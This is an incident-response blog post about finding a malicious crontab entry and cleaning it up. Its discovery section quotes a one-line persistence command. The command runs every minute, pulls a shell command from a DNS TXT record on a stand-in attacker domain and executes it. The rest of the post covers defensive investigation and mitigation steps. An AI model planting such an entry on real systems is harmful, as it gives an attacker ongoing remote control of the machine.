---
title: "Investigation and Mitigation of a System Compromise via Crontab"
date: 2023-01-04 12:02:05
categories: [vulnerabilities]
tags: [vulnerabilities, crontabs, persistence]
---


# Investigation and Mitigation of a System Compromise via Crontab

## Introduction

In the world of information security, detecting and mitigating malicious activities is essential to protect the integrity and confidentiality of systems. Recently, we encountered an intriguing case of system compromise through a crontab command. This article details the discovery, analysis, and mitigation measures taken to resolve the issue.

## Discovery of the Problem

While inspecting the crontabs on the system, the following suspicious entry was found:

```bash
* * * * * /bin/sh -c "sh -c $(dig malicioussite.com TXT +short @ns.malicioussite.com)"
```

This line indicates that a command is executed every minute, querying a DNS TXT record from the domain `malicioussite.com` and executing the result. This technique is often used to maintain control over compromised systems.

## Command Analysis

### Command Components

- `* * * * *`: Indicates that the command is executed every minute.
- `/bin/sh -c`: Executes a shell command.
- `$(dig malicioussite.com TXT +short @ns.malicioussite.com)`: Uses `dig` to query a DNS TXT record and executes the result.

### Suspicious Behavior

This configuration allows an attacker to remotely update the executed command by changing the TXT record on the `ns.malicioussite.com` DNS server. This is a clear indication of a possible command and control (C2) mechanism.

## Mitigation Measures

### 1. Disable the Crontab

To prevent the execution of the malicious command, the crontab entry was disabled:

```bash
sudo crontab -e
```

The suspicious line was commented out or removed.

### 2. Investigate the Machine

Other crontabs and configuration files were inspected to find suspicious commands:

```bash
sudo find /var/spool/cron -type f -exec cat {} \;
sudo find /etc/cron* -type f -exec cat {} \;
```

### 3. Check Network Connections

Tools like `netstat`, `ss`, and `lsof` were used to identify suspicious network connections:

```bash
sudo netstat -tulnp
sudo ss -tulnp
sudo lsof -i
```

### 4. Examine Running Processes

Running processes were checked to identify activities related to `sh -c`:

```bash
ps aux | grep -i 'sh -c'
```

### 5. Check System Logs

System logs were examined to detect suspicious activities:

```bash
sudo tail -n 100 /var/log/syslog
sudo tail -n 100 /var/log/auth.log
```

### 6. Use Security Tools

Rootkit check and security analysis tools were executed:

```bash
sudo chkrootkit
sudo rkhunter --checkall
sudo lynis audit system
```

### 7. Isolate and Reboot the Machine

The machine was isolated from the network to prevent the spread of malicious activities and was rebooted to ensure system integrity.

### 8. Report and Analyze

The incident was reported to the security team for further analysis and to implement additional security measures.

## Conclusion

Detecting and mitigating malicious activities requires attention to detail and a solid knowledge of available tools and techniques. This case of system compromise via crontab highlighted the importance of continuous vigilance and quick and effective response measures. System security is an ongoing responsibility, and prevention is always the best remedy.

---

_Stay vigilant and keep your systems secure!_
